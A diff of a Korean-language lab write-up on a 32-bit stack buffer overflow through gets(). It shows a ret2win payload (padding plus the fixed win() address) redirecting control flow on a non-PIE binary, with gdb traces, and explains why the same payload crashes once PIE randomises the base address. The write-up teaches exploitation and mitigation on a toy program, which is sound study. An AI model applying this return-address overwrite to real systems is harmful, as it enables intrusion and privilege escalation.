@@ -387,9 +387,9 @@ int main(){
 
 ## 5. PIE off
 
-### 5.1 vuln() 스택 프레임
+### 5.1 `vuln()` disassembly
 
-프롤로그:
+#### 프롤로그
 
 ``` gdb
    0x080491dc <+0>:	push   ebp
@@ -397,20 +397,28 @@ int main(){
    0x080491df <+3>:	sub    esp,0x28
 ```
 
-buf 주소:
+#### `gets()` 호출
 
 ``` gdb
+   0x080491f2 <+22>:	sub    esp,0xc
    0x080491f5 <+25>:	lea    eax,[ebp-0x20]
    0x080491f8 <+28>:	push   eax
    0x080491f9 <+29>:	call   0x8049040 <gets@plt>
 ```
+* buf의 시작 주소 = ebp-0x20
 
-스택 레이아웃:
+#### 에필로그
+```
+   0x08049202 <+38>:	leave
+   0x08049203 <+39>:	ret
+```
+
+#### 스택 레이아웃
 
 ```
 높은 주소
 +--------------------+
-|     saved RET      |
+|     saved RET      | overwrite target
 +--------------------+
 |     saved EBP      |
 +--------------------+ ← ebp
@@ -448,7 +456,6 @@ payload = [padding] + [win() addr]
 
 ### 5.3 결과
 
-`vuln()` 종료 후 `win()`함수로 점프된다:
 ```
 $ (python3 payload.py;cat) | /tmp/pie-lab/pie-off
 input:
@@ -457,7 +464,9 @@ id
 uid=0(root) gid=1000(name) groups=1000(name),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
 ```
 
-payload 주입 전 gdb 확인:
+`vuln()` 종료 후 `win()`함수로 점프된다.
+
+#### payload 주입 전 gdb 확인
 ```
 (gdb) r
 Starting program: /tmp/pie-lab/pie-off 
@@ -475,7 +484,7 @@ Breakpoint 1, 0x08049203 in vuln ()
 * saved RET로 `main()` 내부 주소
 * `vuln()` 종료 후 `main()` 내부로 점프
 
-payload 주입 후 gdb 확인:
+#### payload 주입 후 gdb 확인
 ```
 (gdb) r < <(python3 payload.py)
 The program being debugged has been started already.
@@ -495,9 +504,191 @@ Breakpoint 1, 0x08049203 in vuln ()
 * saved RET로 `win()` 내부 주소
 * `vuln()` 종료 후 `win()` 내부로 점프
 
+#### 정리
+
+PIE off 상태에서는 실행 파일의 코드 주소가 항상 동일하므로,
+공격자는 win() 함수의 주소를 페이로드에 직접 포함시켜
+control flow를 변경할 수 있다.
+
 ---
 
 ## 6. PIE on
+
+### 6.1 vuln() disassembly 분석
+
+PIE가 적용된 바이너리는 **Position Independent Code(PIC)** 형태로 컴파일된다.</br>
+이 때문에 non-PIE 바이너리와 비교했을 때 몇 가지 차이가 나타난다.
+
+#### 프롤로그
+```
+   0x00001210 <+0>:	push   ebp
+   0x00001211 <+1>:	mov    ebp,esp
+   0x00001213 <+3>:	push   ebx
+```
+* ebx가 callee-saved register로 사용되므로 스택에 저장된다.
+
+#### `__x86.get_pc_thunk.bx`
+```
+   0x00001214 <+4>:	sub    esp,0x24
+   0x00001217 <+7>:	call   0x10d0 <__x86.get_pc_thunk.bx>
+   0x0000121c <+12>:	add    ebx,0x2dd8
+```
+32bit x86 아키텍처는 RIP-relative addressing을 지원하지 않는다.</br>
+따라서 PIC 코드에서는 현재 코드 위치를 알아낸 뒤 이를 기준으로
+전역 데이터와 함수 주소를 계산한다.
+
+이때 EBX 레지스터가 PIC base(GOT base)로 사용되며,
+이를 초기화하는 역할을 하는 것이 `__x86.get_pc_thunk.bx` 이다.
+
+`__x86.get_pc_thunk.bx`를 호출하면 현재 명령어의 주소가 ebx 레지스터에 저장되며,
+이 값을 기준으로 전역 데이터와 코드의 주소를 계산한다.
+
+> **노트 ── __x86.get_pc_thunk.bx 와 ebx**
+>
+> `__x86.get_pc_thunk.bx`의 실제 실행 흐름은 다음과 같다.
+> ```
+> call get_pc_thunk
+> ↓
+> [esp] = get_pc_thunk의 return address
+> ↓
+> mov ebx, [esp]
+> ↓
+> EBX = 현재 코드 주소
+> ```
+> 따라서 EBX에 현재 코드 주소가 저장된다.
+>
+> 그리고 그 다음 줄인 `add    ebx,0x2dd8` 의 실제 의미는
+> ```
+> EBX = current PC + offset
+>     = GOT base 
+> ```
+> 즉, EBX가 Gloabal Offset Table의 기준 주소로 쓰이게 된다.
+
+#### `gets()`호출:
+```
+   0x00001234 <+36>:	sub    esp,0xc
+   0x00001237 <+39>:	lea    eax,[ebp-0x20]
+   0x0000123a <+42>:	push   eax
+   0x0000123b <+43>:	call   0x1040 <gets@plt>
+```
+* buf의 시작 주소 = ebp-0x20
+
+#### 에필로그
+```
+   0x00001244 <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x00001247 <+55>:	leave
+   0x00001248 <+56>:	ret
+```
+* 저장했던 ebx 값을 복구한 후 함수가 종료된다.
+
+#### 스택 레이아웃
+```
+높은 주소
++--------------------+
+|     saved RET      |
++--------------------+
+|     saved EBP      |
++--------------------+ ← ebp
+|     saved EBX      |
++--------------------+ [ebp-0x4]
+|         ...        |
++--------------------+
+|                    | buf
++--------------------+ [ebp-0x20]
+낮은 주소
+```
+
+buf의 위치는 PIE off 바이너리와 동일하므로
+버퍼 오버플로우를 통해 saved RET를 덮는 방식 역시 동일하게 동작한다.
+
+### 6.2 실행 코드 주소
+
+#### 실행 전
+
+PIE 바이너리에서는 실행 파일의 base 주소가 프로그램 실행 시마다 변경된다.
+
+실행 전 확인하면 `win()`의 주소는 offset 형태로 표시된다.
+```
+(gdb) info addr win
+Symbol "win" is at 0x11cd in a file compiled without debugging.
+```
+
+#### 실행 후
+
+프로그램을 실행하면 실제 주소가 결정된다.
+```
+(gdb) r
+Starting program: /tmp/pie-lab/pie-on 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x635ba214 in vuln ()
+(gdb) info addr win
+Symbol "win" is at 0x635ba1cd in a file compiled without debugging.
+```
+
+이는 실행 파일이 다음과 같은 base 주소에 로드되었기 때문이다.
+```
+(gdb) info proc mappings
+process 4104
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset  Perms   objfile
+	0x635b9000 0x635ba000     0x1000        0x0  r--p   /tmp/pie-lab/pie-on
+	0x635ba000 0x635bb000     0x1000     0x1000  r-xp   /tmp/pie-lab/pie-on
+```
+
+실제 주소는 다음과 같이 계산된다.
+```
+real_address = PIE_base + offset
+
+예) win addr = 0x635ba1cd
+             = 0x635b9000 + 0x11cd
+```
+
+즉, PIE off/on 시의 주소에는 다음과 같은 차이가 발생한다.
+```
+pie-off win = 0x080491a6
+pie-on  win = base + 0x11cd
+```
+
+PIE에서는 함수의 절대 주소가 아닌 offset만 고정되어 있으며,
+실제 주소는 실행 시 결정되는 base 주소에 의해 계산된다.
+
+### 6.3 동일 페이로드 주입
+
+PIE off에서 사용했던 동일한 페이로드를 주입하면 프로그램은 crash 된다.
+
+```
+$ (python3 payload.py;cat) | /tmp/pie-lab/pie-on
+input:
+
+id
+Segmentation fault (core dumped)
+```
+
+gdb로 확인하면 saved RET에는 이전에 사용했던 `win()` 주소가 들어가 있다.
+
+```
+(gdb) r < <(python3 payload.py)
+Starting program: /tmp/pie-lab/pie-on < <(python3 payload.py)
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+input:
+
+Breakpoint 1, 0x60326248 in vuln ()
+(gdb) x/wx $esp
+0xffea06ac:	0x080491a6
+(gdb) ni
+0x080491a6 in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+```
+
+하지만 PIE가 적용된 환경에서는 `win()`의 실제주소가 매번 변경되므로,
+기존 페이로드가 가리키는 주소는 유효하지 않아 프로그램이 crash된다.
 
 ---
 
